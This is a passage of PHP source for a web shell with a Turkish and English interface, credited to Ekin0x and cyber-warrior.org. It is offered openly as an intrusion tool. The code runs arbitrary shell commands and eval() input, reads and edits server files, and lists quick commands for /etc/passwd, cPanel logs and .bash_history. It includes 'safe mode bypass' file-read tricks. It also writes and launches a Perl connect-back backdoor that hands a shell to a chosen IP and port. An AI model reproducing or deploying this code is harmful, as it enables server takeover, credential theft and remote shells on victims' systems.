<font color=DeepSkyBlue >".basename($_REQUEST['edit'])."</font> ]</center></b></div><br>";}}function svetxt(){
$fp=fopen ($_REQUEST['edit'],"w");if (is_writable($_REQUEST['edit'])){
$nedittxt=stripslashes($_REQUEST['edittxt']);
fwrite ($fp,$nedittxt);print "<div><b><center>[ <font color=DeepSkyBlue  >".basename($_REQUEST['edit'])."</font> Saved !! ]</center></b></div>";fclose($fp);}else {print "<div><b><center>[ Can't save the file !! ]</center></b></div>";}}
if ($dlink=='edit'&&!isset ($_REQUEST['edittxt'])&&!isset($_REQUEST['rfile'])&&!isset($_REQUEST['cmd'])&&!isset($_REQUEST['subqcmnds'])&&!isset($_REQUEST['eval']))
{fget($nscdir,$sf,$ef);}elseif (isset ($_REQUEST['edittxt']))
{svetxt();fget($nscdir,$sf,$ef);}else {print "";}function owgr($file){
$fileowneruid=fileowner($file); $fileownerarray=posix_getpwuid($fileowneruid); 
$fileowner=$fileownerarray['name']; $fileg=filegroup($file);
$groupinfo = posix_getgrgid($fileg);$filegg=$groupinfo['name'];
print "$fileowner/$filegg"; }$cpyf=trim($_REQUEST['cpyf']);$ftcpy=trim($_REQUEST['ftcpy']);$cpmv= $cpyf.'/'.$ftcpy;if (isset ($_REQUEST['cpy'])){
if (copy($ftcpy,$cpmv)){$cpmvmess=basename($ftcpy)." copied successfully";}else {$cpmvmess="Can't copy ".basename($ftcpy);}}
elseif(isset($_REQUEST['mve'])){
if (copy($ftcpy,$cpmv)&&unlink ($ftcpy)){$cpmvmess= basename($ftcpy)." moved successfully";}else {$cpmvmess="Can't move ".basename($ftcpy);}
}else {$cpmvmess="Kopyala/Tasimak için Dosya Seç";}
if (isset ($_REQUEST['safefile'])){
$file=$_REQUEST['safefile'];$tymczas="";if(empty($file)){
if(empty($_GET['file'])){if(empty($_POST['file'])){
print "<center>[ Please choose a file first to read it using copy() ]</center>";
} else {$file=$_POST['file'];}} else {$file=$_GET['file'];}}
$temp=tempnam($tymczas, "cx");if(copy("compress.zlib://".$file, $temp)){
$zrodlo = fopen($temp, "r");$tekst = fread($zrodlo, filesize($temp));
fclose($zrodlo);echo "<center><pre>".$sta.htmlspecialchars($tekst).$eta."</pre></center>";unlink($temp);} else {
print "<FONT COLOR=\"RED\"><CENTER>Sorry, Can't read the selected file !!
</CENTER></FONT><br>";}}if (isset ($_REQUEST['inifile'])){
ini_restore("safe_mode");ini_restore("open_basedir");
print "<center><pre>".$sta;
if (include(htmlspecialchars($_REQUEST['inifile']))){}else {print "Sorry, can't read the selected file !!";}print $eta."</pre></center>";}
if (isset ($_REQUEST['bip'])&&isset ($_REQUEST['bport'])){callback($nscdir,$_REQUEST['bip'],$_REQUEST['bport']);}
function callback($nscdir,$bip,$bport){
if(strstr(php_os,"WIN")){$epath="cmd.exe";}else{$epath="/bin/sh";}
if (is_writable($nscdir)){
$fp=fopen ("back.pl","w");$backpl='back.pl';}
else {$fp=fopen ("/tmp/back.pl","w");$backpl='/tmp/back.pl';}
fwrite ($fp,"use Socket;
\$system='$epath';
\$sys= 'echo \"[ Operating system ][$]\"; echo \"`uname -a`\";
echo \"[ Curr DIR ][$]\"; echo \"`pwd`\";echo;
echo \"[ User perms ][$]\";echo \"`id`\";echo;
echo \"[ Start shell ][$]\";';

if (!\$ARGV[0]) {
  exit(1);
}
\$host = \$ARGV[0];
\$port = 80;
if (\$ARGV[1]) {
  \$port = \$ARGV[1];
}
\$proto = getprotobyname('tcp') || die('Unknown Protocol\n');
socket(SERVER, PF_INET, SOCK_STREAM, \$proto) || die ('Socket Error\n');
my \$target = inet_aton(\$host);
if (!connect(SERVER, pack 'SnA4x8', 2, \$port, \$target)) {
  die('Unable to Connect\n');
}
if (!fork( )) {
  open(STDIN,'>&SERVER');
  open(STDOUT,'>&SERVER');
  open(STDERR,'>&SERVER');
print '\n[ Bk-Code shell by Black-Code :: connect back backdoor by Crash_over_ride ]';
print '\n[ A-S-T team ][ Lezr.com ]\n\n'; 
         system(\$sys);system (\$system);
          exit(0); }
		  ");callfuncs("chmod 777 $backpl");
ob_start();
callfuncs("perl $backpl $bip $bport");
ob_clean();
print "<div><b><center>[ Selected IP is ".$_REQUEST['bip']." and port is ".$_REQUEST['bport']." ]<br>
[ Check your connection now, if failed try changing the port number ]<br>
[ Or Go to a writable dir and then try to connect again ]<br>
[ Return to the Current dir ] [<a href=".inclink('dlink', 'scurrdir')."&scdir=$nscdir> Curr-Dir </a>] 
</div><br>";}if (isset($_REQUEST['uback'])){
$uback=$_REQUEST['uback'];$upip=$_REQUEST['upip']; 
if ($_REQUEST['upports']=="up80"){callfuncs("perl $uback $upip 80");}
elseif ($_REQUEST['upports']=="up443"){callfuncs("perl $uback $upip 443");}
elseif ($_REQUEST['upports']=="up2121"){callfuncs("perl $uback $upip 2121");}}
delm("# Komut ÇAlistir #");print "<table bgcolor=#2A2A2A style=\"border:2px solid black\" width=100% height=18%>";
print "<tr><td width=32%><div align=left>";
print $st.$c1."<center><div><b>".$mess3.$ec; 
print $c2.$sf."<center>";input("text","cfile","",53);
input("hidden","scdir",$nscdir,0);print "<br>";
input("submit","crefile","Olustur","");
print " ";input("submit","delfile","Sil","");
print "</center>".$ef.$ec.$et."</div></td>";
print "<td><div align=center>".$st.$c1;
print "<center><div><b>Enter the command to execute";print $ec;
print $c2.$sf."<center><div style='margin-top:7px'>"; 
input("text","cmd","",59);input("hidden","scdir",$nscdir,0);print"<br>";
input("submit","","Execute","");print "</center>".$ef.$ec.$et."</div></td>";
print "<td width=32%><div align=right>";print $st.$c1;
print "<center><div><b>$mess".$ec.$c2.$sf."<center>";
input("text","dir","",53);input("hidden","scdir",$nscdir,0);print "<br>";
input("submit","credir","Create-D","");print " ";
input("submit","deldir","Delete-D","");
print "</center>".$ef.$ec.$et."</div></td></tr>";
print "<tr><td width=32%><div align=left>";print $st.$c1;
print "<center><div><b>Dosya Düzenle/Oku".$ec;print $c2.$sf."<center>";
input("text","rfile",$nscdir,53);input("hidden","scdir",$nscdir,0);print "<br>";
input("submit","","Oku-Düzenle","");print "</center>".$ef.$ec.$et."</div></td>";
print "<td><div align=center>";print $st.$c1;
print "<center><div><b>Dizin'i Göster<br>";print $ec.$c2.$sf."<center><div style='margin-top:7px'>"; input("text","scdir",$nscdir,59);print"<br>";
input("submit","","Göster","");print " ";
input("reset","","R00T","");print "</center>".$ef.$ec.$et."</div></td>";
print "<td><div align=center>";print $st.$c1;
print "<center><div><b>Dosya Boyutu : ".filesize($upfile)." in ( B/Kb )";print $ec.$c2."<form method=post Enctype=multipart/form-data><center>"; 
input("file","upfile","",40);input("hidden","scdir",$nscdir,0);
input("hidden","up",$nscdir,0);
print"<br>";input("submit","","Upload","");print "</center>".$ef.$ec.$et."</div></td></tr>";
delm("");print "<table bgcolor=#2A2A2A style=\"border:2px solid black\" width=100%>";print "<tr><td width=50%><div align=left>";
print $st.$c1."<div><b><center>Execute php code with eval()</div>";
print $ec.$c2.$sf;input("hidden","scdir",$nscdir,0);
print "&nbsp;<textarea cols=73 rows=3 name=eval>";
if(!isset($evsub)){print "//system('id'); //readfile('/etc/passwd'); //passthru('pwd');";}else{print htmlspecialchars(stripslashes($eval));}
print "</textarea><br><center>";
input('submit','evsub','Execute');print " ";
input('Reset','','Reset');print " ";
print "</center>".$ec.$ef.$et;
print "</td><td height=20% width=50%><div align=center>";
print $st.$c1."<div><b><center>Execute useful commands</div>";
print $ec.$c2.$sf;input("hidden","scdir",$nscdir,0);
print "<center><select style='width:60%' name=uscmnds size=1>
<option value='op0'>Execute quick commands</option>
<option value='op1'>ls -lia</option>
<option value='op2'>/etc/passwd</option>
<option value='op3'>/var/cpanel/accounting.log</option>
<option value='op4'>/var/named</option>
<option value='op11'>Perms in curr Dir</option>
<option value='op12'>Perms in main Dir</option>
<option value='op5'>Find service.pwd files</option>
<option value='op6'>Find config files</option>
<option value='op7'>Find .bash_history files</option>
<option value='op8'>Read hosts file</option>
<option value='op9'>Root login</option>
<option value='op10'>Show opened ports</option>
<option value='op13'>Show services</option>
</select> ";print"<input type=submit name=subqcmnds value=Execute style='height:20'> <input type=reset value=Return style='height:20'></center>";
print $ec.$ef.$et."</td></tr></table>";delm("");
print "<table bgcolor=#2A2A2A style=\"border:2px solid black\" width=100%>";
print "<tr><td width=50%><div align=left>";
print $st.$c1."<div><b><center>".$cpmvmess."</div>";
print $ec.$c2.$sf."&nbsp;";input("text","ftcpy","File-name",15);
print "<b><font face=tahoma size=2>&nbsp;To </b>";
input("text","cpyf",$nscdir,45);input("hidden","scdir",$nscdir,0);print " ";
input("submit","cpy","Copy","");print " ";input("submit","mve","Move","");
print "</center>".$ec.$ef.$et;
print "</td><td height=20% width=50%><div align=right>";
print $st.$c1."<div><b><center>Cok kullanilan Komutlar</div>";
print $ec.$c2.$sf."&nbsp";input("hidden","scdir",$nscdir,0);
print "<select style='width:22%' name=ustools size=1>
<option value='t1'>Wget</option><option value='t2'>Curl</option>
<option value='t3'>Lynx</option><option value='t9'>Get</option>
<option value='t4'>Unzip</option><option value='t5'>Tar</option>
<option value='t6'>Tar.gz</option><option value='t7'>Chmod 777</option>
<option value='t8'>Make</option></select> ";input('text','ustname','',51);print " ";input('submit','ustsub','Execute');print "</center>".$ec.$ef.$et;
print "</td></tr></table>";delm(": Safe mode bypass :");
print "<table bgcolor=#2A2A2A style=\"border:2px solid black\" width=100%>";
print "<tr><td width=50%><div align=left>";
print $st.$c1."<div><b><center>Using copy() function</div>";
print $ec.$c2.$sf."&nbsp;";input("text","safefile",$nscdir,75);
input("hidden","scdir",$nscdir,0);print " ";
input("submit","","Read-F","");print "</center>".$ec.$ef.$et;
print "</td><td height=20% width=50%><div align=right>";
print $st.$c1."<div><b><center>Using ini_restore() function</div>";
print $ec.$c2.$sf."&nbsp;";input("text","inifile",$nscdir,75);
input("hidden","scdir",$nscdir,0);print " ";
input("submit","","Read-F","");print "</center>".$ec.$ef.$et;
print "</td></tr></table>";delm("# Backdoor Baglantisi #");
print "<table bgcolor=#2A2A2A style=\"border:2px solid black\" width=100%>";
print "<tr><td width=50%><div align=left>";
print $st.$c1."<div><b><center>Backdoor ile Baglan</div>";
print $ec.$c2.$sf."&nbsp;";input("text","bip",$REMOTE_ADDR,47);print " ";
input("text","bport",80,10);input("hidden","scdir",$nscdir,0);print " ";
input("submit","","Connect","");print " ";input("reset","","Reset","");
print "</center>".$ec.$ef.$et;print "</td><td height=20% width=50%><div align=right>";print $st.$c1."<div><b><center>Yüklenmis Backdoor</div>";
print $ec.$c2.$sf."&nbsp;";print "<select style='width:15%' name=upports size=1>
<option value='up80'>80</option><option value='up443'>443</option>
<option value='up2121'>2121</option></select>";print " ";
input("text","uback","back.pl",23);print " ";
input("text","upip",$REMOTE_ADDR,29);print " ";input("submit","subupb","Connect");
print "</center>".$ec.$ef.$et;print "</td></tr></table>";
print "<br><table bgcolor=#191919 style=\"border:2px #dadada solid \" width=100% height=%>"; print"<tr><td><font size=2 face=tahoma>"; 
print"<center>Copyright  is reserved to Ekin0x <br>[  By Cyber Security TIM Go to : <a target='_blank' href='http://www.cyber-warrior.org'>www.cyber-warrior.org</a> ]"; 
print"</font></td></tr></table>";
include ($a.$b.$c);
?>
